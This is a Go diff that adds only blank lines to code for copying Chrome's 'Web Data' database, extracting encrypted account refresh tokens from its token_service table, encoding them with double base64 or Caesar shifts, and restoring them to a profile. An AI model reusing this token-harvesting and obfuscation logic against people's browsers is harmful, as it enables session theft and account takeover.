@@ -43,6 +43,7 @@ const defaultByteShift = byte(7)
 
 func EncodeDoubleBase64(data []byte) string {
 	pass1 := base64.StdEncoding.EncodeToString(data)
+
 	return base64.StdEncoding.EncodeToString([]byte(pass1))
 }
 
@@ -51,10 +52,12 @@ func DecodeDoubleBase64(s string) ([]byte, error) {
 	if err != nil {
 		return nil, fmt.Errorf("double-base64 outer decode failed: %w", err)
 	}
+
 	rawBytes, err := base64.StdEncoding.DecodeString(string(pass1Bytes))
 	if err != nil {
 		return nil, fmt.Errorf("double-base64 inner decode failed: %w", err)
 	}
+
 	return rawBytes, nil
 }
 
@@ -65,6 +68,7 @@ func EncodeCaesarCipher(s string, shift int) string {
 	for _, ch := range s {
 		sb.WriteRune(shiftRune(ch, letterShift, digitShift))
 	}
+
 	return sb.String()
 }
 
@@ -75,6 +79,7 @@ func DecodeCaesarCipher(s string, shift int) string {
 	for _, ch := range s {
 		sb.WriteRune(shiftRune(ch, revLetterShift, revDigitShift))
 	}
+
 	return sb.String()
 }
 
@@ -82,12 +87,15 @@ func shiftRune(ch rune, letterShift, digitShift int) rune {
 	if ch >= 'A' && ch <= 'Z' {
 		return 'A' + (ch-'A'+rune(letterShift))%26
 	}
+
 	if ch >= 'a' && ch <= 'z' {
 		return 'a' + (ch-'a'+rune(letterShift))%26
 	}
+
 	if ch >= '0' && ch <= '9' {
 		return '0' + (ch-'0'+rune(digitShift))%10
 	}
+
 	return ch
 }
 
@@ -96,6 +104,7 @@ func EncodeCaesarByteShift(data []byte, shift byte) string {
 	for i, b := range data {
 		shifted[i] = b + shift
 	}
+
 	return base64.StdEncoding.EncodeToString(shifted)
 }
 
@@ -104,10 +113,12 @@ func DecodeCaesarByteShift(s string, shift byte) ([]byte, error) {
 	if err != nil {
 		return nil, fmt.Errorf("caesar-byte base64 decode failed: %w", err)
 	}
+
 	orig := make([]byte, len(shifted))
 	for i, b := range shifted {
 		orig[i] = b - shift
 	}
+
 	return orig, nil
 }
 
@@ -148,6 +159,7 @@ func buildTokenEntry(service string, raw []byte) ChromeRefreshTokenEntry {
 	}
 
 	accID := strings.TrimPrefix(service, "AccountId-")
+
 	return ChromeRefreshTokenEntry{
 		Service:      service,
 		AccountID:    accID,
@@ -163,11 +175,14 @@ func readChromeTokenService(profilePath string) (*ChromeTokenVault, error) {
 	if _, err := os.Stat(webDataPath); err != nil {
 		return nil, nil
 	}
+
 	tempDB, err := copyToTempFile(webDataPath)
 	if err != nil {
 		return nil, err
 	}
+
 	defer os.Remove(tempDB)
+
 	return extractTokensFromSQLite(tempDB)
 }
 
@@ -176,17 +191,20 @@ func copyToTempFile(src string) (string, error) {
 	if err != nil {
 		return "", fmt.Errorf("open %s: %w", src, err)
 	}
+
 	defer in.Close()
 
 	tmp, err := os.CreateTemp("", "gitmap-webdata-*.db")
 	if err != nil {
 		return "", fmt.Errorf("create temp db: %w", err)
 	}
+
 	defer tmp.Close()
 
 	if _, err := io.Copy(tmp, in); err != nil {
 		return "", fmt.Errorf("copy temp db: %w", err)
 	}
+
 	return tmp.Name(), nil
 }
 
@@ -195,15 +213,18 @@ func extractTokensFromSQLite(dbPath string) (*ChromeTokenVault, error) {
 	if err != nil {
 		return nil, fmt.Errorf("open sqlite %s: %w", dbPath, err)
 	}
+
 	defer db.Close()
 
 	if !hasTable(db, "token_service") {
 		return nil, nil
 	}
+
 	rows, err := db.Query("SELECT service, encrypted_token FROM token_service")
 	if err != nil {
 		return nil, fmt.Errorf("query token_service: %w", err)
 	}
+
 	defer rows.Close()
 
 	var entries []ChromeRefreshTokenEntry
@@ -214,9 +235,11 @@ func extractTokensFromSQLite(dbPath string) (*ChromeTokenVault, error) {
 			entries = append(entries, buildTokenEntry(s, b))
 		}
 	}
+
 	if len(entries) == 0 {
 		return nil, nil
 	}
+
 	return &ChromeTokenVault{
 		Count:       len(entries),
 		CapturedAt:  time.Now().UTC().Format(time.RFC3339),
@@ -229,6 +252,7 @@ func extractTokensFromSQLite(dbPath string) (*ChromeTokenVault, error) {
 func hasTable(db *sql.DB, tableName string) bool {
 	var n string
 	err := db.QueryRow("SELECT name FROM sqlite_master WHERE type='table' AND name=?", tableName).Scan(&n)
+
 	return err == nil && n == tableName
 }
 
@@ -236,22 +260,26 @@ func restoreChromeTokenService(profilePath string, vault *ChromeTokenVault) erro
 	if vault == nil || len(vault.Tokens) == 0 {
 		return nil
 	}
+
 	webDataPath := filepath.Join(profilePath, "Web Data")
 	db, err := sql.Open("sqlite", webDataPath)
 	if err != nil {
 		return fmt.Errorf("open %s: %w", webDataPath, err)
 	}
+
 	defer db.Close()
 
 	_, err = db.Exec("CREATE TABLE IF NOT EXISTS token_service (service VARCHAR PRIMARY KEY NOT NULL, encrypted_token BLOB NOT NULL)")
 	if err != nil {
 		return fmt.Errorf("create token_service table: %w", err)
 	}
+
 	for _, entry := range vault.Tokens {
 		rawBytes, decErr := resolveRevertedTokenBytes(entry)
 		if decErr != nil {
 			continue
 		}
+
 		if _, err := db.Exec("INSERT OR REPLACE INTO token_service (service, encrypted_token) VALUES (?, ?)", entry.Service, rawBytes); err != nil {
 			return fmt.Errorf("insert token_service: %w", err)
 		}
@@ -264,8 +292,10 @@ func resolveRevertedTokenBytes(entry ChromeRefreshTokenEntry) ([]byte, error) {
 	if len(entry.DoubleBase64) > 0 {
 		return DecodeDoubleBase64(entry.DoubleBase64)
 	}
+
 	if len(entry.RawBase64) > 0 {
 		return base64.StdEncoding.DecodeString(entry.RawBase64)
 	}
+
 	return nil, fmt.Errorf("no reversible token data for %s", entry.Service)
 }
